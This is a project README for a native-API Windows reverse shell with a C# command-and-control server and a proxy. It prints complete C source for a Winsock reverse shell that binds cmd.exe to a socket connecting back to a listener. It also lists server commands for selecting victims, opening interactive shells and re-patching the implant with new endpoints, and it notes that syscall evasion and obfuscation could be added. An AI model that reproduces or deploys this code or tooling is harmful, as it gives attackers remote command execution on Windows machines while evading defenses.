# Reverse Shell Native

The goal was to reproduce a reverse shell with only native (NT function). No CRT, No IAT, No Winsock. The server is in C#, cross-platform enable. And reverse shell is pure C for Windows (x64) and able to reconnect if losing connection to server.
It works as expected and is currently a POC.  It is also possible to add evasion for syscalls and obfuscation.

## Socket 

The first thing to get away was Winsock API. And I find amazing articles combining last research about socket with the most low-level control possible. [Under the Hood of AFD.sys Part 1: Investigating Undocumented Interfaces](https://leftarcode.com/posts/afd-reverse-engineering-part1/) and [Under the Hood of AFD.sys Part 2: TCP handshake](https://leftarcode.com/posts/afd-reverse-engineering-part2/). We only need here to create a socket, bind it and connect it. Not sending or receiving data since we're gonna associate std in/out/err to socket handle.

## Sub-process

The most complicated part here. It consists of creating a process using NtCreateUserProcess while redirecting std in/out/err. With a bit reversing of base code the CreateProcessA [Simple Reverse Shell in C](https://omergnscr.medium.com/simple-reverse-shell-in-c-be1c2f8a40b8):

```C
#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
// Need to link with Ws2_32.lib
#pragma comment(lib, "ws2_32.lib")

WSADATA wsaData;
SOCKET winSock;
struct sockaddr_in sockAddr;

int port = 8081;
char* ip = "127.0.0.1";

STARTUPINFO sinfo;
PROCESS_INFORMATION pinfo;

int main(int argc, char* argv[]) {

    int start = WSAStartup(MAKEWORD(2, 2), &wsaData);

    winSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    sockAddr.sin_family = AF_INET;
    sockAddr.sin_port = htons(port);
    sockAddr.sin_addr.s_addr = inet_addr(ip);

    WSAConnect(winSock, (SOCKADDR*)&sockAddr, sizeof(sockAddr), NULL, NULL, NULL, NULL);

    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = STARTF_USESTDHANDLES;
    sinfo.hStdError = (HANDLE)winSock;
    sinfo.hStdInput = (HANDLE)winSock;
    sinfo.hStdOutput = (HANDLE)winSock;
    //LoadLibraryA("DllInspector.dll");
    CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);

    return 0;
}
```

I was able to re-create (not completely) the interesting part by duplicating socket handle and assigning duplicated handle to sub-process. See in the code. Also, it could be possible to use PS_ATTRIBUTE_STD_HANDLE_INFO in the last parameter of NtCreateUserProcess. I did not try. 

Thanks to @Maldev-Academy for inspiration for this.

![NativeShell](https://github.com/arsium/Reverse-Shell-Native/blob/main/NativeShell.jpg?raw=true)

## Server

```
Commands:
	display/list										- Show all connected clients
    select <endpoint>    								- Select a client
    interact/shell          							- Enter interactive shell with selected client
    server
            start <port>    							- Start a new server
    patch
			network <ip> <port> [OPT]<output name>      - Patch the reverse shell with a new endpoint to connect
    exit                                           		- Exit the program
```

## Proxy

```
<local port> <remote ip> <remote port>
```

## Example

![NativeShellProxy](https://github.com/arsium/Reverse-Shell-Native/blob/main/Proxy.png?raw=true)

